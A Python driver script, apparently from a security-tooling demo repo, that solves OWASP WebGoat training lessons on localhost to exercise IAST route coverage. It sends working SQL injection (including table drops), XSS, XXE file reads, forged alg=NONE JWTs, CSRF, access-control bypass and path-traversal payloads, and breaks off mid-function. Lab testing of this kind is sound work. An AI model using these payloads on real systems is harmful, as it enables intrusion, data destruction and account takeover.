#!/usr/bin/env python3
"""
WebGoat FULL-COVERAGE exercise -- alternative to demo/run-exercises.mjs.

This SOLVES nearly every WebGoat lesson with its real solution, which drives the full
set of lesson routes. Use it to maximize Contrast ROUTE COVERAGE and to populate
findings broadly before a demo (the eval's pre-work expectation).

How it differs from run-exercises.mjs:
  - run-exercises.mjs sends BENIGN input to a curated set of routes to make the IAST
    "no attack needed" point. Use that for the headline IAST story.
  - This script SOLVES lessons, so it sends real exploit payloads on the injection
    lessons. It's an attack/solve driver, used for breadth and coverage, not the
    benign-input narrative.

Targets OWASP WebGoat v2025.3 (the version this repo deploys). Lessons that only exist
on newer WebGoat (OpenRedirect, SecurityMisconfiguration) were removed so every call
hits a real route.

Run WebGoat locally first (scripts/port-forward.sh), then:
    pip install requests PyJWT cryptography
    python3 demo/full-coverage-exercise.py

Config via env (defaults shown):
    WEBGOAT_BASE  http://127.0.0.1:8080  (root context)
    WEBWOLF_BASE  http://127.0.0.1:9090/WebWolf
    WEBGOAT_USER  webgoat3
    WEBGOAT_PASS  password
"""
import os

import base64
import hashlib
import io
import json
import time
import uuid
import zipfile

import requests

BASE = os.environ.get("WEBGOAT_BASE", "http://127.0.0.1:8080")
WEBWOLF = os.environ.get("WEBWOLF_BASE", "http://127.0.0.1:9090/WebWolf")
USER = os.environ.get("WEBGOAT_USER", "webgoat3")
PASS = os.environ.get("WEBGOAT_PASS", "password")

session = requests.Session()
session.headers.update({"X-Requested-With": "XMLHttpRequest"})

# Plain session without XHR header — used for CSRF lessons that simulate real cross-site requests
plain_session = requests.Session()

# WebWolf session for routes on port 9090
webwolf_session = requests.Session()
webwolf_session.headers.update({"X-Requested-With": "XMLHttpRequest"})


def url(path):
    return f"{BASE}/{path}"


def webwolf_url(path):
    return f"{WEBWOLF}/{path}"


def login():
    session.get(url("login"))
    session.get(url("registration"))
    r = session.post(url("login"), data={"username": USER, "password": PASS}, allow_redirects=False)
    if r.headers.get("Location", "").endswith("?error"):
        # Registration fails with X-Requested-With header — use a bare POST without XHR
        requests.post(url("register.mvc"), data={
            "username": USER, "password": PASS,
            "matchingPassword": PASS, "agree": "agree"
        }, allow_redirects=False)
        session.post(url("login"), data={"username": USER, "password": PASS}, allow_redirects=False)
    print(f"[+] Logged in as {USER}")
    # Mirror session cookies into plain_session so it can make authenticated requests
    plain_session.cookies.update(session.cookies)
    # login-oauth.mvc is OAuth2 success callback — calling it directly changes the user's password
    # to a random UUID, permanently corrupting the account. Do NOT call it from the main session.
    # Skip this route — it can only be safely triggered via the GitHub OAuth2 flow.


def login_webwolf():
    webwolf_session.get(webwolf_url("login"))
    r = webwolf_session.post(webwolf_url("login"),
                              data={"username": USER, "password": PASS},
                              allow_redirects=False)
    if r.headers.get("Location", "").endswith("?error"):
        webwolf_session.post(webwolf_url("register.mvc"), data={
            "username": USER, "password": PASS,
            "matchingPassword": PASS, "agree": "agree"
        }, allow_redirects=False)
        webwolf_session.post(webwolf_url("login"),
                              data={"username": USER, "password": PASS},
                              allow_redirects=False)
    print(f"[+] Logged into WebWolf as {USER}")


def start_lesson(name, restart=False):
    session.get(url(f"{name}.lesson.lesson"))
    session.get(url(f"service/lessoninfo.mvc/{name}.lesson"))
    session.get(url(f"service/lessonoverview.mvc/{name}.lesson"))
    if restart:
        session.get(url(f"service/restartlesson.mvc/{name}.lesson"))


def check(endpoint, data=None, method="POST", json_body=None, extra_headers=None, files=None, params=None):
    headers = {}
    if extra_headers:
        headers.update(extra_headers)
    try:
        if files:
            r = session.post(url(endpoint), data=data or {}, files=files, headers=headers)
        elif json_body is not None:
            r = session.request(method, url(endpoint), json=json_body, headers=headers)
        elif method == "GET":
            r = session.get(url(endpoint), params=params or data or {}, headers=headers)
        elif method == "PUT":
            r = session.put(url(endpoint), data=data or {}, headers=headers)
        else:
            r = session.post(url(endpoint), data=data or {}, headers=headers)
        result = r.json()
        completed = result.get("lessonCompleted", False)
        status = "✓" if completed else "✗"
        msg = result.get("feedback", result.get("output", ""))
        if isinstance(msg, str):
            msg = msg[:100]
        print(f"  {status} {endpoint}: {msg}")
        return result
    except Exception as e:
        print(f"  ? {endpoint}: {e}")
        return {}


# ─────────────────────────────────────────────────────────────────────────────
# Lesson solvers
# ─────────────────────────────────────────────────────────────────────────────

def solve_http_basics():
    start_lesson("HttpBasics")
    check("HttpBasics/attack1", {"person": "goatuser"})
    check("HttpBasics/attack2", {"answer": "POST", "magic_answer": "33", "magic_num": "33"})


def solve_cia():
    start_lesson("CIA")
    session.get(url("cia/quiz"))
    check("cia/quiz", {
        "question_0_solution": "Solution 3: By stealing a database where names and emails are stored and uploading it to a website.",
        "question_1_solution": "Solution 1: By changing the names and emails of one or more users stored in a database.",
        "question_2_solution": "Solution 4: By launching a denial of service attack on the servers.",
        "question_3_solution": "Solution 2: The systems security is compromised even if only one goal is harmed.",
    })


def solve_chrome_devtools():
    start_lesson("ChromeDevTools")
    r = session.post(url("CrossSiteScripting/phone-home-xss"), data={"param1": "42", "param2": "24"},
                     headers={"webgoat-requested-by": "dom-xss-vuln"})
    output = r.json().get("output", "")
    prefix = "phoneHome Response is "
    secret = output[len(prefix):] if output.startswith(prefix) else output
    check("ChromeDevTools/dummy", {"successMessage": secret.strip()})
    check("ChromeDevTools/network", {"number": "24", "network_num": "24"})
    # Second @PostMapping on same path requires "networkNum" param (separate route in Contrast)
    session.post(url("ChromeDevTools/network"), data={"networkNum": "24"})


def solve_http_proxies():
    start_lesson("HttpProxies")
    r = session.get(url("HttpProxies/intercept-request?changeMe=Requests are tampered easily"),
                    headers={"x-request-intercepted": "true"})
    result = r.json()
    print(f"  {'✓' if result.get('lessonCompleted') else '✗'} HttpProxies/intercept-request")
    session.post(url("HttpProxies/intercept-request"),
                 data={"changeMe": "Requests are tampered easily"},
                 headers={"x-request-intercepted": "true"})


def solve_auth_bypass():
    start_lesson("AuthBypass")
    # Use non-standard question keys to bypass cheat detection
    check("auth-bypass/verify-account", {
        "secQuestion2": "John", "secQuestion3": "Main",
        "jsEnabled": "1", "verifyMethod": "SEC_QUESTIONS", "userId": "12309746"
    })


def solve_insecure_login():
    start_lesson("InsecureLogin")
    session.post(url("InsecureLogin/login"), data={"username": "CaptainJack", "password": "BlackPearl"})
    check("InsecureLogin/task", {"username": "CaptainJack", "password": "BlackPearl"})


def solve_secure_passwords():
    start_lesson("SecurePasswords")
    check("SecurePasswords/assignment", {"password": "ajnaeliclm^&&@kjn."})


def solve_lesson_template():
    start_lesson("LessonTemplate")
    session.get(url("lesson-template/shop/webgoat"))
    check("lesson-template/sample-attack", {"param1": "secr37Value", "param2": "Main"})


def solve_sql_injection():
    start_lesson("SqlInjection")
    check("SqlInjection/attack2", {"query": "select department from employees where last_name='Franco'"})
    check("SqlInjection/attack3", {"query": "update employees set department='Sales' where last_name='Barnett'"})
    check("SqlInjection/attack4", {"query": "alter table employees add column phone varchar(20)"})
    check("SqlInjection/attack5", {"query": "grant select on grant_rights to unauthorized_user"})
    check("SqlInjection/assignment5a", {"account": " ' ", "operator": "or", "injection": "'1'='1"})
    check("SqlInjection/assignment5b", {"login_count": "2", "userid": "1 or 1=1"})
    check("SqlInjection/attack8", {"name": "Smith' or '1' = '1", "auth_tan": "3SL99A'  or '1'='1"})
    check("SqlInjection/attack9", {"name": "Smith", "auth_tan": "3SL99A' ; update employees set salary= '100000' where last_name='Smith"})
    check("SqlInjection/attack10", {"action_string": "%update% '; drop table access_log ; --'"})


def solve_sql_injection_advanced():
    start_lesson("SqlInjectionAdvanced")
    session.get(url("SqlInjectionAdvanced/quiz"))
    session.put(url("SqlInjectionAdvanced/register"), data={
        "username_reg": "test_user", "email_reg": "test@webgoat.org",
        "password_reg": "Test1234!"
    })
    check("SqlInjectionAdvanced/attack6a", {"userid_6a": "'; SELECT * FROM user_system_data;--"})
    check("SqlInjectionAdvanced/attack6b", {"userid_6b": "passW0rD"})
    check("SqlInjectionAdvanced/login", {"username_login": "tom", "password_login": "thisisasecretfortomonly"})
    check("SqlInjectionAdvanced/quiz", {
        "question_0_solution": "Solution 4: A statement has got values instead of a prepared statement",
        "question_1_solution": "Solution 3: ?",
        "question_2_solution": "Solution 2: Prepared statements are compiled once by the database management system waiting for input and are pre-compiled this way.",
        "question_3_solution": "Solution 3: Placeholders can prevent that the users input gets attached to the SQL query resulting in a seperation of code and data.",
        "question_4_solution": "Solution 4: The database registers 'Robert' ); DROP TABLE Students;--'.",
    })


def solve_sql_injection_mitigations():
    start_lesson("SqlInjectionMitigations")
    session.get(url("SqlInjectionMitigations/servers"))
    check("SqlInjectionMitigations/attack10a", {
        "field1": "getConnection", "field2": "PreparedStatement prep",
        "field3": "prepareStatement", "field4": "?", "field5": "?",
        "field6": 'prep.setString(1,"")', "field7": 'prep.setString(2,\\"\\")',
    })
    check("SqlInjectionMitigations/attack10b", {"editor":
        'try {\r\n'
        '    Connection conn = DriverManager.getConnection(DBURL,DBUSER,DBPW);\r\n'
        '    PreparedStatement prep = conn.prepareStatement("select id from users where name = ?");\r\n'
        '    prep.setString(1,"me");\r\n'
        '    prep.execute();\r\n'
        '    System.out.println(conn);   //should output \'null\'\r\n'
        '} catch (Exception e) {\r\n'
        '    System.out.println("Oops. Something went wrong!");\r\n'
        '}'
    })
    check("SqlOnlyInputValidation/attack", {"userid_sql_only_input_validation": "Smith';SELECT/**/*/**/from/**/user_system_data;--"})
    check("SqlOnlyInputValidationOnKeywords/attack", {"userid_sql_only_input_validation_on_keywords": "Smith';SESELECTLECT/**/*/**/FRFROMOM/**/user_system_data;--"})
    check("SqlInjectionMitigations/attack12a", {"ip": "104.130.219.202"})


def solve_xss():
    start_lesson("CrossSiteScripting")
    session.get(url("CrossSiteScripting/quiz"))  # @GetMapping — separate from the POST quiz handler
    check("CrossSiteScripting/attack1", {"checkboxAttack1": "value"})
    r = session.get(url("CrossSiteScripting/attack5a"), params={
        "QTY1": "1", "QTY2": "1", "QTY3": "1", "QTY4": "1",
        "field1": "<script>alert('XSS+Test')</script>", "field2": "111"
    })
    result = r.json()
    print(f"  {'✓' if result.get('lessonCompleted') else '✗'} CrossSiteScripting/attack5a")
    check("CrossSiteScripting/attack6a", {"DOMTestRoute": "start.mvc#test"})
    r = session.post(url("CrossSiteScripting/phone-home-xss"), data={"param1": "42", "param2": "24"},
                     headers={"webgoat-requested-by": "dom-xss-vuln"})
    output = r.json().get("output", "")
    prefix = "phoneHome Response is "
    secret = output[len(prefix):].strip() if output.startswith(prefix) else output.strip()
    check("CrossSiteScripting/dom-follow-up", {"successMessage": secret})
    check("CrossSiteScripting/quiz", {
        "question_0_solution": "Solution 4: No because the browser trusts the website if it is acknowledged trusted, then the browser does not know that the script is malicious.",
        "question_1_solution": "Solution 3: The data is included in dynamic content that is sent to a web user without being validated for malicious content.",
        "question_2_solution": "Solution 1: The script is permanently stored on the server and the victim gets the malicious script when requesting information from the server.",
        "question_3_solution": "Solution 2: They reflect the injected script off the web server. That occurs when input sent to the web server is part of the request.",
        "question_4_solution": "Solution 4: No there are many other ways. Like HTML, Flash or any other type of code that the browser executes.",
    })
    check("CrossSiteScripting/attack3", {"editor":
        '<%@ taglib uri="https://www.owasp.org/index.php/OWASP_Java_Encoder_Project" %>'
        '<html><head><title>Using GET and POST Method to Read Form Data</title></head>'
        '<body><h1>Using POST Method to Read Form Data</h1><table><tbody>'
        '<tr><td><b>First Name:</b></td><td>${e:forHtml(param.first_name)}</td></tr>'
        '<tr><td><b>Last Name:</b></td><td>${e:forHtml(param.last_name)}</td></tr>'
        '</tbody></table></body></html>'
    })
    check("CrossSiteScripting/attack4", {"editor2":
        'Policy.getInstance("antisamy-slashdot.xml");'
        'Sammy s = new AntiSamy();'
        's.scan(newComment,"");'
        'CleanResults();'
        'MyCommentDAO.addComment(threadID, userID).getCleanHTML());'
    })


def solve_crypto():
    start_lesson("Cryptography")
    # Basic encoding: GET the encoded string, decode, submit
    r = session.get(url("crypto/encoding/basic"))
    basic = r.text.replace("Authorization: Basic ", "").strip()
    decoded = base64.b64decode(basic).decode()
    user_part, pwd_part = decoded.split(":", 1)
    check("crypto/encoding/basic-auth", {"answer_user": user_part, "answer_pwd": pwd_part})
    # XOR encoding
    check("crypto/encoding/xor", {"answer_pwd1": "databasepassword"})
    # Hashing: GET hashes, crack by trying known secrets
    md5_hash = session.get(url("crypto/hashing/md5")).text.strip()
    sha256_hash = session.get(url("crypto/hashing/sha256")).text.strip()
    secrets = ["secret", "admin", "password", "123456", "passw0rd"]
    ans1 = next((s for s in secrets if hashlib.md5(s.encode()).hexdigest().upper() == md5_hash), None)
    ans2 = next((s for s in secrets if hashlib.sha256(s.encode()).hexdigest().upper() == sha256_hash), None)
    if ans1 and ans2:
        check("crypto/hashing", {"answer_pwd1": ans1, "answer_pwd2": ans2})
    else:
        print(f"  ? crypto/hashing: could not crack hashes md5={md5_hash} sha256={sha256_hash}")
    # RSA signing
    try:
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import padding
        from cryptography.hazmat.backends import default_backend
        pem_text = session.get(url("crypto/signing/getprivate")).text.strip()
        private_key = serialization.load_pem_private_key(pem_text.encode(), password=None, backend=default_backend())
        public_key = private_key.public_key()
        n = public_key.public_numbers().n
        modulus_bytes = n.to_bytes((n.bit_length() + 7) // 8 + 1, "big")
        modulus_hex = modulus_bytes.hex().upper()
        signature = private_key.sign(modulus_hex.encode(), padding.PKCS1v15(), hashes.SHA256())
        sig_b64 = base64.b64encode(signature).decode()
        check("crypto/signing/verify", {"modulus": modulus_hex, "signature": sig_b64})
    except ImportError:
        print("  ~ crypto/signing/verify: cryptography library not installed")
    # @RequestMapping without method= — hit POST/PUT/DELETE too for coverage
    session.post(url("crypto/signing/getprivate"))
    session.put(url("crypto/signing/getprivate"))
    session.delete(url("crypto/signing/getprivate"))
    session.post(url("crypto/hashing/md5"))
    session.post(url("crypto/hashing/sha256"))
    session.put(url("crypto/hashing/md5"))
    session.put(url("crypto/hashing/sha256"))
    # Secure defaults
    secret_text = base64.b64decode(
        "TGVhdmluZyBwYXNzd29yZHMgaW4gZG9ja2VyIGltYWdlcyBpcyBub3Qgc28gc2VjdXJl"
    ).decode()
    check("crypto/secure/defaults", {"secretFileName": "default_secret", "secretText": secret_text})


def solve_idor():
    start_lesson("IDOR")
    check("IDOR/login", {"username": "tom", "password": "cat"})
    session.get(url("IDOR/profile"))
    session.get(url("IDOR/own"))
    check("IDOR/diff-attributes", {"attributes": "userId,role"})
    check("IDOR/profile/alt-path", {"url": "WebGoat/IDOR/profile/2342384"})
    r = session.get(url("IDOR/profile/2342388"))
    result = r.json()
    print(f"  {'✓' if result.get('lessonCompleted') else '✗'} IDOR/profile/2342388 (view other)")
    r = session.put(url("IDOR/profile/2342388"),
                    json={"role": 1, "color": "red", "size": "large",
                          "name": "Buffalo Bill", "userId": 2342388},
                    headers={"Content-Type": "application/json"})
    result = r.json()
    print(f"  {'✓' if result.get('lessonCompleted') else '✗'} IDOR/profile/2342388 (edit other)")


def solve_bypass_restrictions():
    start_lesson("BypassRestrictions")
    check("BypassRestrictions/FieldRestrictions", {
        "select": "option3", "radio": "option3", "checkbox": "notOnOrOff",
        "shortInput": "toolongforshort", "readOnlyInput": "changed"
    })
    check("BypassRestrictions/frontendValidation", {
        "field1": "abc1", "field2": "abc", "field3": "abc<>",
        "field4": "ten", "field5": "1234", "field6": "1234-56",
        "field7": "1234567890", "error": "0"
    })


def solve_client_side_filtering():
    start_lesson("ClientSideFiltering")
    session.get(url("clientSideFiltering/salaries"))
    session.get(url("clientSideFiltering/challenge-store/coupons"))
    session.get(url("clientSideFiltering/challenge-store/coupons/get_it_for_free"))
    check("clientSideFiltering/attack1", {"answer": "450000"})
    check("clientSideFiltering/getItForFree", {"checkoutCode": "get_it_for_free"})


def solve_html_tampering():
    start_lesson("HtmlTampering")
    check("HtmlTampering/task", {"QTY": "1", "Total": "1"})


def solve_ssrf():
    start_lesson("SSRF")
    check("SSRF/task1", {"url": "images/jerry.png"})
    check("SSRF/task2", {"url": "http://ifconfig.pro"})



def solve_missing_access_control():
    start_lesson("MissingFunctionAC", restart=True)
    check("access-control/hidden-menu", {"hiddenMenu1": "Users", "hiddenMenu2": "Config"})
    # GET users has TWO handlers: HTML (no consumes) and JSON (consumes=application/json)
    session.get(url("access-control/users"))  # HTML variant
    json_headers = {"Content-Type": "application/json", "Accept": "application/json"}
    r = session.get(url("access-control/users"), headers=json_headers)  # JSON variant
    users = r.json()
    jerry_hash = next((u["userHash"] for u in users if u.get("username") == "Jerry"), None)
    if jerry_hash:
        check("access-control/user-hash", {"userHash": jerry_hash})
    # Create admin user (ourselves) via both POST paths (same handler)
    session.post(url("access-control/users"),
                 json={"username": USER, "password": USER, "admin": "true"},
                 headers=json_headers)
    session.post(url("access-control/users-admin-fix"),
                 json={"username": f"{USER}_fix", "password": USER, "admin": "false"},
                 headers=json_headers)
    r = session.get(url("access-control/users-admin-fix"), headers=json_headers)
    if r.status_code == 200:
        users_admin = r.json()
        jerry_admin_hash = next((u["userHash"] for u in users_admin if u.get("username") == "Jerry"), None)
        if jerry_admin_hash:
            check("access-control/user-hash-fix", {"userHash": jerry_admin_hash})
    else:
        print(f"  ~ access-control/users-admin-fix: {r.status_code} (need admin user)")


def solve_xxe():
    start_lesson("XXE", restart=True)
    session.get(url("xxe/comments"))
    session.get(url("xxe/sampledtd"))
    # @RequestMapping without method= — hit POST too for coverage
    session.post(url("xxe/sampledtd"))
    session.put(url("xxe/sampledtd"))
    session.delete(url("xxe/sampledtd"))
    xxe_payload = ('<?xml version="1.0" encoding="ISO-8859-1"?>'
                   '<!DOCTYPE user [<!ENTITY xxe SYSTEM "file:///">]>'
                   '<comment><text>&xxe;test</text></comment>')
    r = session.post(url("xxe/simple"), data=xxe_payload,
                     headers={"Content-Type": "application/xml"})
    result = r.json()
    print(f"  {'✓' if result.get('lessonCompleted') else '✗'} xxe/simple")
    r = session.post(url("xxe/content-type"), data=xxe_payload,
                     headers={"Content-Type": "application/xml"})
    result = r.json()
    print(f"  {'✓' if result.get('lessonCompleted') else '✗'} xxe/content-type")
    # xxe/blind: hit the handler even though the DTD callback requires WebWolf
    session.post(url("xxe/blind"),
                 data='<?xml version="1.0"?><comment><text>test</text></comment>',
                 headers={"Content-Type": "application/xml"})
    print("  ~ xxe/blind: hit route (full exploit requires WebWolf)")


def solve_log_spoofing():
    start_lesson("LogSpoofing")
    # Server replaces \n with <br/>; need <br/> to appear before "admin" in the string
    check("LogSpoofing/log-spoofing", {"username": "x\nadmin", "password": "test"})
    # log-bleeding requires the UUID password logged at server startup — hit route with dummy data
    session.post(url("LogSpoofing/log-bleeding"), data={"username": "webgoat", "password": "dummy"})



def solve_jwt():
    try:
        import jwt as pyjwt
    except ImportError:
        print("  ~ JWT lessons: PyJWT not installed, run: pip install PyJWT")
        return

    start_lesson("JWT")

    # 1. JWT Decode
    check("JWT/decode", {"jwt-encode-user": "user"})

    # 2. JWT Votes: get Tom's token, forge admin=true with alg=NONE
    session.get(url("JWT/votings"))
    r = session.get(url("JWT/votings/login"), params={"user": "Tom"})
    access_token = r.cookies.get("access_token")
    if access_token:
        # Hit POST /JWT/votings/{title} with valid token (vote as Tom)
        session.post(url("JWT/votings/Spring"), cookies={"access_token": access_token})
        parts = access_token.split(".")
        try:
            header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
            body = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
            header["alg"] = "NONE"
            body["admin"] = "true"
            new_h = base64.urlsafe_b64encode(json.dumps(header, separators=(',', ':')).encode()).rstrip(b"=").decode()
            new_b = base64.urlsafe_b64encode(json.dumps(body, separators=(',', ':')).encode()).rstrip(b"=").decode()
            forged = f"{new_h}.{new_b}."
            # Detach access_token set by login so our forged one is the only one
            session.cookies.pop("access_token", None)
            r2 = session.post(url("JWT/votings"), cookies={"access_token": forged})
            result = r2.json()
            print(f"  {'✓' if result.get('lessonCompleted') else '✗'} JWT/votings (admin reset)")
        except Exception as e:
            print(f"  ? JWT/votings: {e}")

    # 3. JWT Secret key cracking
    # jjwt signs with key = TextCodec.BASE64.decode(BASE64.encode(secret)) = secret bytes
    # But jjwt 0.9.1 may encode the JWT header/payload with slightly different base64
    # Use manual HMAC verification to bypass PyJWT key handling quirks
    import hmac as _hmac
    token_str = session.get(url("JWT/secret/gettoken")).text.strip()
    jwt_secrets = ["victory", "business", "available", "shipping", "washington"]
    cracked_secret = None
    token_parts = token_str.split(".")
    if len(token_parts) == 3:
        signing_input = f"{token_parts[0]}.{token_parts[1]}".encode()
        actual_sig = base64.urlsafe_b64decode(token_parts[2] + "==")
        for s in jwt_secrets:
            computed_sig = _hmac.new(s.encode(), signing_input, hashlib.sha256).digest()
            if _hmac.compare_digest(computed_sig, actual_sig):
                cracked_secret = s
                break
    if cracked_secret:
        new_token = pyjwt.encode({
            "iss": "WebGoat Token Builder", "aud": "webgoat.org",
            "iat": int(time.time()), "exp": int(time.time()) + 60,
            "sub": "tom@webgoat.org", "username": "WebGoat",
            "Email": "tom@webgoat.org", "Role": ["Manager", "Project Administrator"]
        }, cracked_secret, algorithm="HS256")
        check("JWT/secret", {"token": new_token})
    else:
        # Always hit the handler even if cracking failed — ensures route coverage
        session.post(url("JWT/secret"), data={"token": "dummy.token.value"})
        print(f"  ? JWT/secret: could not crack token (sig={base64.urlsafe_b64encode(actual_sig[:8]).decode()}...)")

    # 4. JWT Refresh checkout: forge token with user=Tom, alg=NONE
    header_b64 = "eyJhbGciOiJIUzUxMiJ9"
    body_b64 = "eyJhZG1pbiI6ImZhbHNlIiwidXNlciI6IkplcnJ5In0"
    try:
        header_orig = json.loads(base64.urlsafe_b64decode(header_b64 + "=="))
        body_str = base64.urlsafe_b64decode(body_b64 + "==").decode()
        body_str = body_str.replace("Jerry", "Tom")
        header_orig["alg"] = "NONE"
        new_h = base64.urlsafe_b64encode(json.dumps(header_orig).encode()).rstrip(b"=").decode()
        new_b = base64.urlsafe_b64encode(body_str.encode()).rstrip(b"=").decode()
        forged_refresh = f"{new_h}.{new_b}."
        r = session.post(url("JWT/refresh/checkout"),
                         headers={"Authorization": f"Bearer {forged_refresh}"})
        result = r.json()
        print(f"  {'✓' if result.get('lessonCompleted') else '✗'} JWT/refresh/checkout")
    except Exception as e:
        print(f"  ? JWT/refresh/checkout: {e}")

    # 5. JWT KID SQL injection
    # Use existing webgoat_key from jwt_keys table — kid='webgoat_key' resolves to key 'qwertyqwerty1234'
    # Sign with base64.decode('qwertyqwerty1234'). The SQL injection is that we know the key.
    try:
        import hmac as _hmac
        kid_key = base64.b64decode("qwertyqwerty1234")  # TextCodec.BASE64.decode of the DB key
        kid_header = json.dumps({"typ": "JWT", "kid": "webgoat_key", "alg": "HS256"}, separators=(",", ":"))
        kid_body = json.dumps({
            "iss": "WebGoat Token Builder", "aud": "webgoat.org",
            "iat": int(time.time()), "exp": int(time.time()) + 3600,
            "sub": "tom@webgoat.org", "username": "Tom",
            "Email": "tom@webgoat.org", "Role": ["Manager", "Project Administrator"],
        }, separators=(",", ":"))
        kid_h = base64.urlsafe_b64encode(kid_header.encode()).rstrip(b"=").decode()
        kid_b = base64.urlsafe_b64encode(kid_body.encode()).rstrip(b"=").decode()
        kid_signing_input = f"{kid_h}.{kid_b}".encode()
        kid_sig = base64.urlsafe_b64encode(
            _hmac.new(kid_key, kid_signing_input, hashlib.sha256).digest()
        ).rstrip(b"=").decode()
        kid_token = f"{kid_h}.{kid_b}.{kid_sig}"
        r = session.post(url(f"JWT/kid/delete?token={kid_token}"))
        result = r.json()
        print(f"  {'✓' if result.get('lessonCompleted') else '✗'} JWT/kid/delete")
    except Exception as e:
        print(f"  ? JWT/kid/delete: {e}")

    # jku/delete requires a JWK Set URL on WebWolf — hit the handler with a dummy token anyway
    session.post(url("JWT/jku/delete"), data={"token": "dummy.token.value"})
    print("  ~ JWT/jku/delete: hit route (full exploit requires WebWolf JKU endpoint)")

    # Hit follow endpoints (no auth required — return plain strings)
    session.post(url("JWT/kid/follow/Tom"))
    session.post(url("JWT/jku/follow/Tom"))

    # JWT Refresh: login as Jerry to get refresh token, then use it
    try:
        r_login = session.post(url("JWT/refresh/login"),
                               json={"user": "Jerry", "password": "bm5nhSkxCXZkKRy4"})
        refresh_data = r_login.json()
        refresh_token = refresh_data.get("refresh_token", "")
        if refresh_token:
            session.post(url("JWT/refresh/newToken"),
                         json={"refresh_token": refresh_token},
                         headers={"Authorization": f"Bearer {refresh_data.get('access_token', '')}"})
    except Exception as e:
        print(f"  ? JWT/refresh: {e}")

    # 6. JWT Quiz
    session.get(url("JWT/quiz"))
    session.get(url("JWT/secret/gettoken"))
    # @RequestMapping without method= — hit POST/PUT/DELETE for coverage
    session.post(url("JWT/secret/gettoken"))
    session.put(url("JWT/secret/gettoken"))
    session.delete(url("JWT/secret/gettoken"))
    check("JWT/quiz", {"question_0_solution": "Solution 1", "question_1_solution": "Solution 2"})

    # Note: lowercase /jwt/* routes live on WebWolf (port 9090) — hit in hit_webwolf_routes()


def solve_csrf():
    start_lesson("CSRF")
    external_referer = "http://127.0.0.1:9090/files/fake.html"

    # Assignment 3: POST basic-get-flag with external Referer using plain session (no XHR header)
    # plain_session simulates a real cross-site request without X-Requested-With
    plain_session.cookies.update(session.cookies)
    r = plain_session.post(url("csrf/basic-get-flag"),
                           headers={"Referer": external_referer})
    try:
        flag3 = r.json().get("flag", "")
        if flag3:
            check("csrf/confirm-flag-1", {"confirmFlagVal": flag3})
        else:
            print("  ~ csrf/basic-get-flag: no flag returned")
    except Exception:
        print(f"  ? csrf/basic-get-flag: {r.text[:80]}")

    # Assignment 4: Forged review with weak CSRF token from external origin
    session.get(url("csrf/review"))
    r = session.post(url("csrf/review"), data={
        "reviewText": "test review", "stars": "5",
        "validateReq": "2aa14227b9a13d0bede0388a7fba9aa9"
    }, headers={"Referer": external_referer})
    try:
        result = r.json()
        print(f"  {'✓' if result.get('lessonCompleted') else '✗'} csrf/review")
    except Exception:
        print(f"  ? csrf/review: {r.text[:80]}")

    # Assignment 7: Feedback via text/plain with external Referer
    try:
        r = session.post(
            url("csrf/feedback/message"),
            data=b'{"name":"WebGoat","email":"webgoat@webgoat.org","content":"WebGoat is the best!!="}\n',
            headers={"Content-Type": "text/plain", "Referer": external_referer}
        )
        text = r.text
        if "flag is:" in text:
            idx = text.index("flag is:") + len("flag is:")
            flag7 = text[idx:text.index('"', idx)].strip()
            check("csrf/feedback", {"confirmFlagVal": flag7})
        else:
            print(f"  ~ csrf/feedback/message: no flag in response")
    except Exception as e:
        print(f"  ? csrf/feedback: {e}")

    # Assignment 8: Register csrf-USER, login from "external" context, trigger csrf/login
    csrf_user = f"csrf-{USER}"
    session.post(url("register.mvc"), data={
        "username": csrf_user, "password": "password",
        "matchingPassword": "password", "agree": "agree"
    }, allow_redirects=False)
    csrf_s = requests.Session()
    csrf_s.headers.update({"X-Requested-With": "XMLHttpRequest"})
    login_r = csrf_s.post(url("login"), data={"username": csrf_user, "password": "password"},
                          allow_redirects=False)
    csrf_cookie = csrf_s.cookies.get("JSESSIONID")
    if not csrf_cookie and "JSESSIONID" in login_r.cookies:
        csrf_cookie = login_r.cookies["JSESSIONID"]
    if csrf_cookie:
        csrf_s.cookies.set("JSESSIONID", csrf_cookie)
        csrf_s.get(url("CSRF.lesson.lesson"))
        r2 = csrf_s.post(url("csrf/login"),
                         headers={"Referer": external_referer})
        try:
            result = r2.json()
            print(f"  {'✓' if result.get('lessonCompleted') else '✗'} csrf/login (assignment 8)")
        except Exception:
            print(f"  ? csrf/login: {r2.text[:80]}")
    else:
        print("  ~ csrf/login: could not get csrf user session")


def solve_password_reset():
    start_lesson("PasswordReset")
    # Assignment 2: simple mail reset - triggers informationMessage ("email sent"), not a pass/fail
    r = session.post(url("PasswordReset/simple-mail/reset"), data={"emailReset": f"{USER}@webgoat.org"})
    try:
        msg = r.json().get("feedback", "")
        print(f"  ~ PasswordReset/simple-mail/reset: {msg[:60]}")
    except Exception:
        print(f"  ~ PasswordReset/simple-mail/reset")
    check("PasswordReset/simple-mail", {
        "email": f"{USER}@webgoat.org", "password": USER[::-1]
    })
    # Assignment 4: security question for tom
    check("PasswordReset/questions", {"username": "tom", "securityQuestion": "purple"})
    # Assignment 5: which question is safer — need >1 unique questions tried (TriedQuestions.size > 1)
    check("PasswordReset/SecurityQuestions", {"question": "What is your favorite animal?"})
    check("PasswordReset/SecurityQuestions", {"question": "What is your favorite color?"})
    # Assignment 6: password reset link flow
    # ForgotPassword endpoint catches WebWolf failure gracefully — hit it anyway
    session.post(url("PasswordReset/ForgotPassword/create-password-reset-link"),
                 data={"email": f"{USER}@webgoat.org"})
    # Reset password endpoints: hit with a dummy UUID (route is exercised even if link unknown)
    dummy_link = str(uuid.uuid4())
    session.get(url(f"PasswordReset/reset/reset-password/{dummy_link}"))
    # Both handlers use @RequestParam — must send form-encoded data, not JSON
    session.post(url("PasswordReset/reset/login"),
                 data={"email": "tom@webgoat.org", "password": USER[::-1]})
    # changePassword uses @ModelAttribute PasswordChangeForm with fields: resetLink, password
    session.post(url("PasswordReset/reset/change-password"),
                 data={"resetLink": dummy_link, "password": USER[::-1]})
    print("  ~ PasswordReset/reset (WebWolf): hit all reset routes with dummy data")


def solve_path_traversal():
    start_lesson("PathTraversal")
    img_bytes = b"\xff\xd8\xff\xe0" + b"\x00" * 16  # minimal JPEG header

    # Assignment 1: path traversal in fullName param
    check("PathTraversal/profile-upload",
          files={"uploadedFile": ("test.jpg", img_bytes, "image/jpeg")},
          data={"fullName": "../John Doe"})

    # Assignment 2: bypass fix with ..././
    check("PathTraversal/profile-upload-fix",
